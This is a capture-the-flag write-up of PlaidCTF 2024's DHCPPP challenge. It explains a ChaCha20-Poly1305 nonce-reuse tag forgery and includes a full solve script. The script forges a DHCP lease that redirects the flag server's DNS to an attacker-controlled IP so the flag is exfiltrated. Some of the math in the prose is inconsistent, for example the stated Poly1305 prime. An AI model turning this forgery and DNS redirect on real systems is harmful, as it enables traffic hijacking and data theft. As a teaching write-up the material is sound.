---
title: "DHCPPP, PlaidCTF 2024"
description: "Writeup of DHCPPP from plaid ctf 2024"
date: 2024-04-17
tags: [Crypto, ChaCha20, Poly1305, nonce]
eleventyNavigation:
  key: PlaidCTF2024
  parent: Writeups
---


## Overview

This writeup is also present in my team's website [here](https://sectt.github.io/writeups/Plaid24/DHCPPP/README).


### Given:

```
Investigation Title. DHCPPP
Reporter. anish
Type. Dance Competition
Description. The local latin dance company is hosting a comp. They have a million-dollar wall of lava lamps and prizes so big this must be a once-in-a-lifetime opportunity.
Hypotheses. It's not DNS // There's no way it's DNS // It was DNS
Notes.
nc dhcppp.chal.pwni.ng 1337
```

### TL;DR

* We are presented a server using `ChaCha20-Poly1305`. We need to change the value of the variable `dns.nameservers`, but we can only do that by sending an encrypted message.

* The `key` and `nonce` are both reused, allowing us to create valid tags for any message and therefore encrypt messages.


### Code Analysis

This server allows us to connect to a TCP connection and send packets:

```python

if __name__ == "__main__":
    dhcp = DHCPServer()
    flagserver = FlagServer(dhcp)

    while True:
        pkt = bytes.fromhex(input("> ").replace(" ", "").strip())

        out = dhcp.process_pkt(pkt)
        if out is not None:
            print(out.hex())

        out = flagserver.process_pkt(pkt)
        if out is not None:
            print(out.hex()

```

Each packet will be processed by the `DHCPServer` and `FlagServer` and the responses are printed out.

### DHCPServer

The server constructor defines a list of IP addresses, a MAC address, a geteway IP, among others.

```python

def __init__(self):
        self.leases = []
        self.ips = [f"192.168.1.{i}" for i in range(3, 64)]
        self.mac = bytes.fromhex("1b 7d 6f 49 37 c9")
        self.gateway_ip = "192.168.1.1"

        self.leases.append(("192.168.1.2", b"rngserver_0", time.time(), []))

```

To process each packet, we have:

```python

def process_pkt(self, pkt):
        assert pkt is not None

        src_mac = pkt[:6]
        dst_mac = pkt[6:12]
        msg = pkt[12:]

        if dst_mac != self.mac:
            return None

        if src_mac == self.mac:
            return None

        if len(msg) and msg.startswith(b"\x01"):
            # lease request
            dev_name = msg[1:]
            lease_resp = self.get_lease(dev_name)
            return (
                self.mac +
                src_mac + # dest mac
                lease_resp
            )
        else:
            return None

```
Therefore, in order to get a response, `msg` must start with `\x01`.
The content of `dev_name` is passed to the function `get_lease`:

```python

def get_lease(self, dev_name):
        if len(self.ips) != 0:
            ip = self.ips.pop(0)
            self.leases.append((ip, dev_name, time.time(), []))
        else:
            # relinquish the oldest lease
            old_lease = self.leases.pop(0)
            ip = old_lease[0]
            self.leases.append((ip, dev_name, time.time(), []))

        pkt = bytearray(
            bytes([int(x) for x in ip.split(".")]) +
            bytes([int(x) for x in self.gateway_ip.split(".")]) +
            bytes([255, 255, 255, 0]) +
            bytes([8, 8, 8, 8]) +
            bytes([8, 8, 4, 4]) +
            dev_name +
            b"\x00"
        )

        pkt = b"\x02" + encrypt_msg(pkt, self.get_entropy_from_lavalamps()) + calc_crc(pkt)

        return pkt

```

The functions appends `dev_name` into the `leases` list, takes the next `IP` from the `ips` list and uses that to generate a packet. 
The packet is then encrypted using the result from `get_entropy_from_lavalamps` as a key and a CRC code at the end:

```python

def get_entropy_from_lavalamps(self):
        # Get entropy from all available lava-lamp RNG servers
        # Falling back to local RNG if necessary
        entropy_pool = RNG_INIT

        for ip, name, ts, tags in self.leases:
            if b"rngserver" in name:
                try:
                    # get entropy from the server
                    output = requests.get(f"http://{ip}/get_rng", timeout=TIMEOUT).text  
                    entropy_pool += sha256(output.encode())
                except:
                    # if the server is broken, get randomness from local RNG instead
                    entropy_pool += sha256(secrets.token_bytes(512))

        return sha256(entropy_pool)

```

We noticed that if the name of the lease doesn't cointain `rngserver`, then the result will always be the same, since `RNG_INIT` is fixed. 
This ended up beeing the source of the vulnerability.

### FlagServer

This server is very similar to the one before.

```python

def __init__(self, dhcp):
        self.mac = bytes.fromhex("53 79 82 b5 97 eb")
        self.dns = dns.resolver.Resolver()
        self.process_pkt(dhcp.process_pkt(self.mac+dhcp.mac+b"\x01"+b"flag_server"))

```

The flag is used when `msg` starts with `\x03`:

```python

    def send_flag(self):
        with open("flag.txt", "r") as f:
            flag = f.read().strip()
        curl("example.com", f"/{flag}", self.dns)

    def process_pkt(self, pkt):
        assert pkt is not None

        src_mac = pkt[:6]
        dst_mac = pkt[6:12]
        msg = pkt[12:]

        if dst_mac != self.mac:
            return None

        if src_mac == self.mac:
            return None

        if len(msg) and msg.startswith(b"\x02"):
            # lease response
            pkt = msg[1:-4]
            pkt = decrypt_msg(pkt)
            crc = msg[-4:]
            assert crc == calc_crc(pkt)

            self.ip = ".".join(str(x) for x in pkt[0:4])
            self.gateway_ip = ".".join(str(x) for x in pkt[4:8])
            self.subnet_mask = ".".join(str(x) for x in pkt[8:12])
            self.dns1 = ".".join(str(x) for x in pkt[12:16])
            self.dns2 = ".".join(str(x) for x in pkt[16:20])
            self.dns.nameservers = [self.dns1, self.dns2]
            assert pkt.endswith(b"\x00")

            print("[FLAG SERVER] [DEBUG] Got DHCP lease", self.ip, self.gateway_ip, self.subnet_mask, self.dns1, self.dns2)

            return None

        elif len(msg) and msg.startswith(b"\x03"):
            # FREE FLAGES!!!!!!!
            self.send_flag()
            return None

        else:
            return None


```

The flag is sent to `http://example.com/<flag>`. 
The domain `example.com` is resolved using the `dns` object. 
Then, we must gain control of the nameserver of `dns`, so that `example.com` resolves to a URL controlled by us, sending us the flag.

In order to change the `dns.nameservers`, we must send a message that starts with `\x02`. However, we cannot send our message directly, since it seems to be encrypted.


### Solution

The server uses `ChaCha20-Poly1305`. We noticed that the nonce is equal to `sha256(msg[:32] + nonce[:32])[:12]`. However, we control `msg`, and the `nonce` is the result of `get_entropy_from_lavalamps`, therefore we can ensure that the nonce is always the same and use a reused-nonce attack.

We need to find a way of generating a valid tag for the encrypted message we want to send to `FlagServer`.

`Poly1305` works by creating a polynomial over $\mathbb{F}_p$, with prime $p = 2^{135} - 5$.

$$P(x) = \sum_{n=1}^{q} c_ix^{q-i} \pmod p$$

where the $c_i$'s are the bytes of the message to be authenticated in 16-byte blocks. 

The tag is then generated as:

$$tag = (P(r) + s) \pmod{2^{128}}$$

where $r,s$ are the secret key values.

However, in our case, we can encrypt with constant key and nonce, therefore:

$$t = (\sum_{n=1}^{q} c_ir^{q-i} \pmod p + s) \pmod{2^{128}}$$

$$t' = (\sum_{n=1}^{q} c_i'r^{q-i} \pmod p + s) \pmod{2^{128}}$$

To get rid of $\pmod {2^{128}}$:

$$t = (\sum_{n=1}^{q} c_ir^{q-i} \pmod p + s) + k_1 \cdot 2^{128}$$

$$t' = (\sum_{n=1}^{q} c_i'r^{q-i} \pmod p + s) + k_2 \cdot 2^{128}$$

with $0 \leq k1,k2 \leq 5$. The possible values for each $k_i$ are small due to the fact that $3\cdot 2^{128} \leq p \leq 4\cdot 2^{128}$.
In order to get eliminate $s$,

$$t - t' = \sum_{n=1}^{q} (c_i - c_i')r^{q-i} \pmod p + (k_1 - k_2) \cdot 2^{128}$$

Therefore we can test the possible $k_1, k_2$ values and solve for $r$. 
By looking at the source code of the `ChaCha20-Poly1305` libraries, we also added one extra test for `r`: `r & 0x0ffffffc0ffffffc0ffffffc0fffffff == r`, as `r` is clamped before being used.

Once we know $r$, we know $s$, since

$$ s = tag -  P(r) \pmod{2^{128}}$$

Having this, we can then forge a valid tag for any message of our choice and therefore change the `dns.nameservers` variable and get the flag.

### Solve Script

```python

from pwn import *
import hashlib
import requests
import zlib
from Crypto.Cipher import ChaCha20_Poly1305
import random
from Crypto.Util.number import *
context.log_level = 'critical'

r = remote('dhcppp.chal.pwni.ng',1337)
#r = process('./server.py')

data = r.recvline().decode()[:-1]
data = data.split(' ')
flag_mac = bytes.fromhex("53 79 82 b5 97 eb")
dhcp_mac = bytes.fromhex("1b 7d 6f 49 37 c9")
whatever_mac = bytes.fromhex("00 00 00 00 00 00")

def calc_crc(msg):
    return zlib.crc32(msg).to_bytes(4, "little")

P = 2**130- 5

def get_blocks(c):
    c = c + bytes.fromhex('000000000000000000002e00000000000000')
    real_c = []
    for i in range(0, len(c), 16):
        block = c[i:i+16]
        block = block + b'\x01'
        assert len(block) == 17
        real_c.append(int.from_bytes(block, byteorder='little'))

    return real_c

def tag(c, r, s):
    mod2 = 2**128
    real_c = get_blocks(c)
    c = real_c
    n = len(c)

    res = 0
    for i in range(n):
        res += c[i]
        res = (r*res) % P
    return (res + s) % mod2

def atk(pair1, pair2, nonce, m3):
    m1, c1, t1 = pair1
    m2, c2, t2 = pair2

    t1 = int.from_bytes(t1, byteorder='little')
    t2 = int.from_bytes(t2, byteorder='little')
    keystream = bytes(a ^ b for a, b in zip(c1, m1))
    c3 = bytes(a ^ b for a, b in zip(m3, keystream))

    for k1 in range(5):
        for k2 in range(5):
            t1_ = t1 + k1*2**128
            t2_ = t2 + k2*2**128
            deltat1 = (t2_-t1_)
            for i in range(4):
                guess = pow((deltat1 * inverse(K, P)), inverse(i, P-1), P)

                if guess & 0x0ffffffc0ffffffc0ffffffc0fffffff == guess and guess != 1:
                    r = guess
                    print('Found r:', r)
                    s = tag(c1, r, 0) - t1 
                    t3 = tag(c3, r, s)
                    t3 = long_to_bytes(t3)[::-1]
                    return c3, t3

    assert False, "Attack failed"

def dhcp_msg(dev_name):
    r.recvuntil(b'> ')
    msg = whatever_mac + dhcp_mac + b'\x01' + dev_name
    r.sendline(msg.hex().encode())
    return bytes.fromhex(r.recvline().rstrip().decode())

NUM_LEASES = 64 - 2

for i in range(NUM_LEASES - 2): # 2 leases were already taken
    ret =  dhcp_msg(b'lolada' + str(i).encode())

m1 = b'AAAAAAAAAAAAAAAAAAAAAAAAA'
L1 = dhcp_msg(m1)


for i in range(NUM_LEASES - 1): # Rotate all leases
    ret =  dhcp_msg(b'loladaa' + str(i).encode())

m2 = b'AAAAAAAAAAAAAAAAAAAAAAAAB'
L2 = dhcp_msg(m2) # Almost equal (so nonce is equal) but differ in last bytes

m1 = bytes.fromhex('c0a80102c0a80101ffffff0008080808080804044141414141414141414141414141414141414141414141414100')
m2 = bytes.fromhex('c0a80102c0a80101ffffff0008080808080804044141414141414141414141414141414141414141414141414200')

def extract(lease):
    src_mac = lease[:6]
    assert src_mac == dhcp_mac
    dst_mac = lease[6:12]
    assert dst_mac == whatever_mac
    msg = lease[12:]
    assert msg.startswith(b'\x02')
    pkt = msg[1:-4]
    ct = pkt[:-28]
    tag = pkt[-28:-12]
    nonce = pkt[-12:]
    return ct, tag, nonce

c1, t1, n1 = extract(L1)
c2, t2, n2 = extract(L2)


#K = 237684487542793012780631851008
print('blocks1:', get_blocks(c1))
print('blocks2:', get_blocks(c2))
K = get_blocks(c2)[2] - get_blocks(c1)[2] # Difference of c's
print('K=', K)

assert n1 == n2 # must use the same nonce for the attack to work
n = n1

# Some debug prints
print('m1=', m1.hex())
print('c1=', c1.hex())
print('t1=', t1.hex())
print('m2=', m2.hex())
print('c2=', c2.hex())
print('t2=', t2.hex())
print('nonce=', n.hex())

dns1 = '207.154.233.177' # Our DNS server
dns2 = dns1
dns1 = bytes([int(x) for x in dns1.split(".")])
dns2 = bytes([int(x) for x in dns2.split(".")])

m3 = b'\xc0\xa8\x01\x02\xc0\xa8\x01\x01\xff\xff\xff\x00' + dns1 + dns2 + b'AAAAAAAAAAAAAAAAAAAAAAAAB\x00'

c3, t3 = atk((m1, c1, t1), (m2, c2, t2), n, m3)
forged_lease  = b'\x02' + c3 + t3 + n + calc_crc(m3)

flagserver_pkt = whatever_mac + flag_mac + forged_lease

r.sendline(flagserver_pkt.hex().encode())
r.sendline(b'0300') # Get the flag

while 1:
    try:
        print(r.recvline())
    except:break


```


### Conclusion

Finally, after being able to change the `dns.nameservers` variable, we get the flag. 

**Flag: `PCTF{d0nt_r3u5e_th3_n0nc3_d4839ed727736624}`**



